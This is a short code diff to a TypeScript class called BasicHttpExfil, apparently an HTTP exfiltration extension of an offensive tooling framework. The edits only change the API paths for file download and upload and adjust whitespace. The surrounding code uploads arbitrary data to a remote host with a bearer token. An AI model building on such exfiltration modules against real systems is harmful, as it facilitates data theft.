@@ -71,7 +71,7 @@ export class BasicHttpExfil extends BaseExfilExtension {
         : Api.BASE_URL;
 
     try {
-      const res = await axios.get(`${host}/api/files/download/${id}`, {
+      const res = await axios.get(`${host}/api/${this.name}/download/${id}`, {
         headers: {
           Authorization: `Bearer ${this.api.token}`,
         },
@@ -109,8 +109,8 @@ export class BasicHttpExfil extends BaseExfilExtension {
 
     try {
       const res = await axios.post(
-        `${host}/api/files/upload/${storage}`,
-        data,
+        `${host}/api/${this.name}/upload/${storage}`,
+        data, 
         {
           headers: {
             'Content-Type': 'application/octet-stream',
@@ -122,7 +122,7 @@ export class BasicHttpExfil extends BaseExfilExtension {
         }
       );
 
-      if (!res.data?.id)
+      if (!res.data?.id) 
         return Promise.reject(
           Api.fail_from_error(undefined, 'Failed to upload file ID')
         );
